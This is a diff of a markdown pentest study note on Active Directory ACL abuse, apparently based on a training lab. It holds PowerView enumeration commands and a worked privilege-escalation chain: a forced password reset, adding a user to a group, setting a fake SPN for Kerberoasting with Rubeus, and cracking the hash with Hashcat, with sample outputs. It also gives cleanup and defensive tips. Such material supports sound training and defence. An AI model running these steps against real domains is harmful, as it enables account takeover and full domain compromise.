@@ -1,16 +1,24 @@
 # ACL Abuse in Active Directory
 
-## What are ACLs & ACEs?
+## Table of Contents
+- [ACL Abuse Primer](#acl-abuse-primer)
+- [ACL Enumeration](#acl-enumeration)
+- [ACL Abuse Tactics](#acl-abuse-tactics)
+
+---
+
+## ACL Abuse Primer
+
 - **ACL (Access Control List):** List of permissions on an AD object.
 - **ACE (Access Control Entry):** Single permission entry in an ACL (who, what rights).
 - **DACL:** Who can access/modify the object.
 - **SACL:** What access attempts are audited.
 
-## Why Attackers Care
+**Why attackers care:**
 - Misconfigured ACLs = stealthy privilege escalation, lateral movement, persistence.
 - Abusable rights often go undetected by standard vulnerability scans.
 
-## Key Abusable Rights (for Red/Blue Teams)
+**Key abusable rights:**
 | Right/ACE         | What It Lets You Do                        | Example Tool/Command           |
 |-------------------|--------------------------------------------|-------------------------------|
 | GenericAll        | Full control over object                   | Set-DomainUserPassword        |
@@ -22,45 +30,32 @@
 | AddSelf           | Add self to group (if allowed)             | Add-DomainGroupMember         |
 | AllExtendedRights | Special/rare rights (reset pwd, etc.)      | Set-DomainUserPassword        |
 
+**Typical attack flow:**
+1. Enumerate ACLs (BloodHound, PowerView, ADExplorer)
+2. Find abusable ACEs (see table above)
+3. Exploit (abuse rights)
+4. Escalate/move laterally
+
+---
+
 ## ACL Enumeration
 
 ### PowerView (Targeted Enumeration)
-- **Don't enumerate everything!** Focus on users/groups you control.
 - Get SID of your user:
   ```powershell
-  $sid = Convert-NameToSid wley
+  $sid = ConvertTo-Sid wley
   ```
 - Find objects your user can control:
   ```powershell
   Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
   ```
-  **Example Output:**
-  ```
-  ObjectDN               : CN=Dana Amundsen,OU=DevOps,...
-  ActiveDirectoryRights  : ExtendedRight
-  ObjectAceType          : User-Force-Change-Password
-  AceType                : AccessAllowedObject
-  ...
-  ```
-  - **What to look for:**
-    - `GenericAll` = full control
-    - `GenericWrite` = can write most attributes
-    - `User-Force-Change-Password` = can reset password
-    - `DS-Replication-Get-Changes` = DCSync (can dump hashes)
-
+  - Look for rights like `User-Force-Change-Password`, `GenericWrite`, `GenericAll`, `DS-Replication-Get-Changes`.
 - Map GUIDs to readable names if needed:
   ```powershell
   $guid = "00299570-246d-11d0-a768-00aa006e0529"
   Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | ?{$_.rightsGuid -eq $guid} | fl Name,DisplayName
   ```
-  **Example Output:**
-  ```
-  Name        : User-Force-Change-Password
-  DisplayName : Reset Password
-  ```
-
 - Recursively enumerate: If you control user A, check what A controls, and so on.
-- Use `-Verbose` for more info, and always use `-ResolveGUIDs` for clarity.
 
 ### PowerShell (No PowerView)
 - List all users:
@@ -73,132 +68,92 @@
     get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}
   }
   ```
-  - **Slower and less readable than PowerView, but works if modules are restricted.**
 
 ### BloodHound (Graphical, Fastest for Paths)
-- **Collect data:**
-  - Run SharpHound on a domain-joined host:
-    ```powershell
-    .\SharpHound.exe -c All
-    ```
-  - Or use the PowerShell ingestor:
-    ```powershell
-    Invoke-BloodHound -CollectionMethod All -Domain INLANEFREIGHT.LOCAL -ZipFileName data.zip
-    ```
-- **Upload results:**
-  - Open BloodHound GUI, upload the zip file.
-- **Analyze:**
-  - Set your user as the start node.
-  - Use "Outbound Control Rights" and "Transitive Object Control" to see what you can control.
-  - Right-click edges for help, tools, and OpSec notes.
-  - Use pre-built queries:
-    - "Shortest Paths to High Value Targets"
-    - "Users with DCSync Rights"
-    - "Users with Password Reset Rights"
-- **Edge types to know:**
-  - `ForceChangePassword` (reset password)
-  - `AddMember` (add to group)
-  - `GenericWrite`/`GenericAll` (write or full control)
-  - `GetChangesAll`/`GetChanges` (DCSync)
-- **Example BloodHound path:**
-  - wley → damundsen (ForceChangePassword) → Help Desk Level 1 (GenericWrite) → Information Technology (nested group) → adunn (GenericAll) → DCSync
+- Collect data with SharpHound, upload to BloodHound.
+- Set your user as the start node, check "Outbound Control Rights" and "Transitive Object Control".
+- Use pre-built queries: "Shortest Paths to High Value Targets", "Users with DCSync Rights", etc.
+- Edge types to know: `ForceChangePassword`, `AddMember`, `GenericWrite`, `GenericAll`, `GetChangesAll`/`GetChanges`.
 
-### Troubleshooting & Tips
-- **PowerView import errors:**
-  - Try `Unblock-File .\PowerView.ps1` before importing.
-  - Use a fresh PowerShell session if you get function redefinition errors.
-- **Slow queries:**
-  - Use targeted enumeration (`-Identity <user/group>`), not `*` in large domains.
-- **Missing rights:**
-  - Make sure you have the right permissions to query AD objects.
-  - Some objects may be hidden by adminSDHolder or other protections.
-- **BloodHound issues:**
-  - If you see missing edges, re-run SharpHound with more collection methods.
-  - Check for time sync issues between hosts.
-
-### OpSec Considerations
-- **BloodHound/SharpHound is noisy** (triggers lots of LDAP queries/logs).
-- **PowerView can be noisy** if run with `-Identity *`.
-- **Targeted enumeration is stealthier** (query only what you need).
-- **Password resets, group changes, and DCSync are highly detectable.**
-- **Always get approval before making changes in production.**
+### Troubleshooting & OpSec
+- Use `-Verbose` for feedback.
+- Targeted enumeration is stealthier than querying everything.
+- Monitor for Event ID 5136 (object modified), group membership changes, SPN modifications.
 
 ---
-**Attack Chain Example:**
-1. You control user `wley` (cracked hash).
-2. `wley` can ForceChangePassword for `damundsen`.
-3. `damundsen` has GenericWrite on `Help Desk Level 1` group.
-4. That group is nested in `Information Technology` group.
-5. `Information Technology` has GenericAll on `adunn` (can reset password, add to group, etc).
-6. `adunn` has DCSync rights (can dump all AD hashes).
-
-**Summary:**
-- Enumerate only what matters (your user, their targets, and so on).
-- Use PowerView for targeted, scriptable checks; BloodHound for visual pathing.
-- Always resolve GUIDs for clarity.
-- Recursively follow the chain to high-value targets.
-
-## Typical Attack Flow
-1. **Enumerate ACLs:** BloodHound, PowerView, ADExplorer
-2. **Find abusable ACEs:** Look for above rights on users/groups/computers
-3. **Exploit:** Use PowerView, BloodHound, or built-in tools to abuse rights
-4. **Escalate/Move Laterally:** Reset passwords, add to groups, etc.
-
-<img width="1734" height="821" alt="image" src="https://github.com/user-attachments/assets/3a2ba8ef-5ca0-4dec-bb32-83b605e6d51f" />
-Credit to:  Charlie Bromberg
-
-## Real-World Scenarios
-- Helpdesk can reset Domain Admin passwords (ForceChangePassword)
-- User can add self to privileged group (AddSelf)
-- Service account has GenericWrite on another user (Kerberoasting, persistence)
-
-## Blue Team Tip
-- Regularly audit ACLs on sensitive objects (users, groups, computers, OUs)
-- Use BloodHound's "Shortest Paths to High Value Targets"
-
----
-**Note:** Some ACL attacks are destructive (e.g., password resets). Always get client approval and document changes during assessments. 
 
 ## ACL Abuse Tactics
 
-### Attack Chain Recap
-- **Start:** Control of user `wley` (cracked NTLM hash via Responder + Hashcat)
-- **Goal:** Full domain compromise via DCSync (control of `adunn`)
+Abusing ACLs in Active Directory is a powerful way to escalate privileges, move laterally, and ultimately compromise a domain. Below is a practical, stepwise example based on a real-world attack chain, with explanations and command outputs for each step. This is the kind of chain you might see in Hack The Box, CTFs, or real internal assessments.
+
+### Scenario Recap
+- **Initial foothold:** You control the user `wley` (NTLMv2 hash captured with Responder, cracked with Hashcat).
+- **Goal:** Full domain compromise by obtaining DCSync rights (control of `adunn`).
 
 ### Step 1: Force Password Reset (wley → damundsen)
+**Why:** If you have ForceChangePassword rights, you can reset another user's password without knowing the old one.
 ```powershell
-$SecPassword = ConvertTo-SecureString '<WLEY_PASSWORD>' -AsPlainText -Force
+$SecPassword = ConvertTo-SecureString 'wley_password' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
 $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
 Import-Module .\PowerView.ps1
 Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
 ```
-- **Result:** You control `damundsen`.
+**Output:**
+```
+VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
+```
+- **Result:** You now control `damundsen`.
 
 ### Step 2: Group Membership Abuse (damundsen → Help Desk Level 1)
+**Why:** If you have GenericWrite on a group, you can add users to it, inheriting all its rights (including nested groups).
 ```powershell
 $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
 $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
 Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
 ```
+**Output:**
+```
+VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
+```
 - **Result:** `damundsen` is now in Help Desk Level 1 group.
 
 ### Step 3: Nested Group Escalation (Help Desk Level 1 → Information Technology)
-- Help Desk Level 1 is nested in Information Technology group.
-- Information Technology group has `GenericAll` on `adunn`.
+**Why:** Group nesting means rights are inherited. If Help Desk Level 1 is a member of Information Technology, so is `damundsen`.
+- **Check group nesting:**
+```powershell
+Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
+```
+- **Result:** You inherit all rights of Information Technology group.
 
 ### Step 4: Targeted Kerberoasting (adunn)
+**Why:** If you have GenericAll on a user, you can set a fake SPN, Kerberoast, and crack their password offline.
 - **Create a fake SPN:**
 ```powershell
 Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+```
+**Output:**
+```
+VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
 ```
 - **Kerberoast with Rubeus:**
 ```powershell
 .\Rubeus.exe kerberoast /user:adunn /nowrap
 ```
-- **Crack the hash offline with Hashcat.**
+**Output:**
+```
+[*] SamAccountName         : adunn
+[*] ServicePrincipalName   : notahacker/LEGIT
+[*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL$...
+```
+- **Crack the hash offline with Hashcat:**
+```bash
+hashcat -m 13100 <hashfile> <wordlist>
+```
+- **Result:** You now have the cleartext password for `adunn` (DCSync rights).
 
 ### Step 5: Cleanup
+**Why:** Always revert changes in labs/assessments to avoid detection and maintain integrity.
 - **Remove fake SPN:**
 ```powershell
 Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
@@ -220,4 +175,8 @@ Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Cre
   - Train staff to use BloodHound for regular reviews
 
 ---
-**Note:** This is a real-world attack chain seen in CTFs and real environments. Always document changes and get approval in real assessments. 
+**Pro Tips:**
+- Always use `-Verbose` for feedback.
+- Document every change for reporting.
+- In real environments, get explicit approval before making changes.
+- This chain is common in CTFs and real-world pentests—practice it in labs! 
